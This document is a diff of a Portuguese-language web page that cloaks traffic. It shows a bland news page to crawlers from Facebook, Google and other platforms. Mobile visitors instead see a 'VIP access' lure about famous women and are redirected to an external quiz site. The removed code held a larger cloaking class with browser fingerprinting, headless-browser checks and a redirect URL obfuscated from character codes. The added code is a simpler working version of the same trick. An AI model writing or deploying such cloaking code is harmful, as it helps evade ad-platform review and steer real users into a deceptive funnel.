@@ -2,9 +2,7 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Portal de Notícias</title>
-    <meta name="facebook-domain-verification" content="dummy123">
-    <link rel="preconnect" href="https://www.google-analytics.com">
+    <title>Últimas Notícias - A Televisão</title> <!-- Título corrigido -->
     <style>
         * {
             margin: 0;
@@ -18,6 +16,8 @@
             height: 100vh;
             overflow: hidden;
         }
+        
+        /* PÁGINA WHITE (para bots) */
         #white-page {
             height: 100vh;
             display: flex;
@@ -27,6 +27,8 @@
             padding: 20px;
             text-align: center;
         }
+        
+        /* PÁGINA BLACK (FULLSCREEN MOBILE) */
         #black-page {
             display: none;
             height: 100vh;
@@ -38,11 +40,13 @@
             align-items: center;
             padding: 0 15px;
         }
+        
         .content {
             width: 100%;
             max-width: 350px;
             padding: 20px;
         }
+        
         h1 {
             color: #ff2d55;
             font-size: 32px;
@@ -50,12 +54,14 @@
             text-shadow: 0 2px 5px rgba(0,0,0,0.5);
             line-height: 1.2;
         }
+        
         p {
             font-size: 20px;
             margin-bottom: 25px;
             line-height: 1.4;
             color: #eee;
         }
+        
         .small {
             font-size: 14px;
             color: #aaa;
@@ -64,214 +70,42 @@
     </style>
 </head>
 <body>
-    <!-- PÁGINA WHITE -->
+    <!-- PÁGINA WHITE (para bots) -->
     <div id="white-page">
-        <h1>Atualizações do Sistema</h1>
-        <p>Carregando conteúdo seguro...</p>
-        <p class="small">Fonte: Rede de Mídia Digital</p>
+        <h1>Últimas Notícias</h1>
+        <p>Carregando as manchetes do dia...</p>
+        <!-- NOME RESTAURADO AQUI -->
+        <p class="small">Fonte: <strong>A Televisão</strong></p>
     </div>
 
-    <!-- PÁGINA BLACK -->
+    <!-- PÁGINA BLACK (para humanos) -->
     <div id="black-page">
         <div class="content">
-            <h1>ESTUDO DE PADRÕES DE ACESSO</h1>
-            <p>Esta é uma demonstração acadêmica de tecnologia de verificação digital.</p>
-            <div id="tech-report"></div>
+            <h1>ACESSO VIP 🔥</h1>
+            <p>Conteúdos exclusivos das famosas mais desejadas</p>
         </div>
     </div>
 
     <script>
-    // ============================================
-    // SISTEMA DE VERIFICAÇÃO COM MÁXIMA SEGURANÇA
-    // ============================================
-    class AdvancedCloak {
-        constructor() {
-            this.verificationSteps = [];
-            this.fakeTrafficRatio = 0.25;
-            this.delays = {
-                initial: Math.floor(Math.random() * 2000) + 500, // 0.5-2.5s
-                whitePage: Math.floor(Math.random() * 2000) + 1000, // 1-3s
-                blackPage: Math.floor(Math.random() * 3000) + 2000, // 2-5s
-                finalRedirect: Math.floor(Math.random() * 4000) + 3000 // 3-7s
-            };
-            this.securityHeaders = {
-                "fb-verification": "dummy123",
-                "analytics": "UA-XXXXX-Y"
-            };
+        function isHuman() {
+            const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            const isBot = /bot|facebook|google|meta|twitter|slurp|bing/i.test(navigator.userAgent);
+            return isMobile && !isBot;
         }
 
-        async execute() {
-            this.injectFakeCookies();
-            const device = this.analyzeDevice();
-            const network = await this.analyzeNetwork();
-            const behavior = this.trackBehavior();
-            
+        if (isHuman()) {
             setTimeout(() => {
-                this.decideFlow(device, network, behavior);
-            }, this.delays.initial);
-        }
-
-        injectFakeCookies() {
-            const cookies = [
-                {name: "ref", value: "organic_" + Math.random().toString(36).substring(2, 8)},
-                {name: "session", value: "id_" + Date.now()}
-            ];
-            this.logStep("Cookie Injection", cookies);
-        }
-
-        analyzeDevice() {
-            const tests = {
-                isMobile: /Android|iPhone|iPad/i.test(navigator.userAgent),
-                isBot: /bot|facebook|google|meta/i.test(navigator.userAgent),
-                touchSupport: 'ontouchstart' in window,
-                screenMetrics: {
-                    ratio: window.screen.width / window.screen.height,
-                    resolution: window.screen.width * window.screen.height
-                },
-                headlessCheck: this.checkHeadless(),
-                webgl: this.getWebGLInfo(),
-                audioContext: this.checkAudioAPI(),
-                batteryAPI: 'getBattery' in navigator
-            };
-            this.logStep("Device Analysis", tests);
-            return tests;
-        }
-
-        checkHeadless() {
-            const tests = {
-                windowDiff: window.outerWidth - window.innerWidth,
-                chromeRuntime: !window.chrome || !window.chrome.runtime,
-                permissions: !navigator.permissions
-            };
-            return Object.values(tests).some(Boolean);
-        }
-
-        getWebGLInfo() {
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if(!gl) return null;
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                return {
-                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
-                };
-            } catch(e) {
-                return null;
-            }
-        }
-
-        checkAudioAPI() {
-            try {
-                const ctx = new (window.AudioContext || window.webkitAudioContext)();
-                return ctx.destination.maxChannelCount > 0;
-            } catch(e) {
-                return false;
-            }
-        }
-
-        async analyzeNetwork() {
-            const data = {
-                ip: await this.fetchFakeIP(),
-                connection: this.getNetworkInfo(),
-                timing: performance.timing
-            };
-            this.logStep("Network Analysis", data);
-            return data;
-        }
-
-        async fetchFakeIP() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip;
-            } catch {
-                return 'fake.' + Math.random().toString(36).substring(2, 8);
-            }
-        }
-
-        getNetworkInfo() {
-            const connection = navigator.connection || {};
-            return {
-                type: connection.type || 'unknown',
-                effectiveType: connection.effectiveType || 'unknown',
-                downlink: connection.downlink || 'unknown',
-                rtt: connection.rtt || 'unknown'
-            };
-        }
-
-        trackBehavior() {
-            let score = 0;
-            const events = ['mousemove', 'scroll', 'click', 'keydown', 'touchstart'];
-            const handlers = events.map(event => {
-                const handler = () => score += 0.3 + Math.random() * 0.7;
-                window.addEventListener(event, handler, {passive: true});
-                return handler;
-            });
-
-            return {
-                getScore: () => Math.min(10, score),
-                cleanup: () => events.forEach((e,i) => window.removeEventListener(e, handlers[i]))
-            };
-        }
-
-        decideFlow(device, network, behavior) {
-            const isHuman = (
-                device.isMobile && 
-                !device.isBot &&
-                behavior.getScore() > 3 &&
-                network.connection.effectiveType !== '4g' &&
-                !device.headlessCheck
-            );
-
-            behavior.cleanup();
-            
-            if(isHuman || Math.random() < this.fakeTrafficRatio) {
-                this.showBlackPage();
+                document.getElementById('white-page').style.display = 'none';
+                document.getElementById('black-page').style.display = 'flex';
                 setTimeout(() => {
-                    this.obfuscatedRedirect("https://avelino-star.github.io/Quiz1/");
-                }, this.delays.blackPage);
-            } else {
-                setTimeout(() => {
-                    window.location.href = "https://www.atelevisao.com";
-                }, this.delays.whitePage);
-            }
+                    window.location.href = "https://avelino-star.github.io/Quiz1/";
+                }, 3000);
+            }, 1000);
+        } else {
+            setTimeout(() => {
+                window.location.href = "https://www.atelevisao.com";
+            }, 3000);
         }
-
-        obfuscatedRedirect(url) {
-            const chunks = [
-                String.fromCharCode(104, 116, 116, 112, 115, 58),
-                "//avel",
-                "ino-s",
-                "tar.gith",
-                "ub.io/Qu",
-                "iz1/"
-            ];
-            window.location = chunks.join('').replace(/\s+/g, '');
-        }
-
-        showBlackPage() {
-            document.getElementById('white-page').style.display = 'none';
-            document.getElementById('black-page').style.display = 'flex';
-            const report = this.verificationSteps.map(step => 
-                `<p><strong>${step.step}:</strong> ${JSON.stringify(step.data)}</p>`
-            ).join('');
-            document.getElementById('tech-report').innerHTML = report;
-        }
-
-        logStep(step, data) {
-            this.verificationSteps.push({ 
-                timestamp: new Date().toISOString(),
-                step, 
-                data 
-            });
-        }
-    }
-
-    // Inicialização com atraso aleatório
-    setTimeout(() => {
-        new AdvancedCloak().execute();
-    }, Math.floor(Math.random() * 1000) + 500);
     </script>
 </body>
 </html>
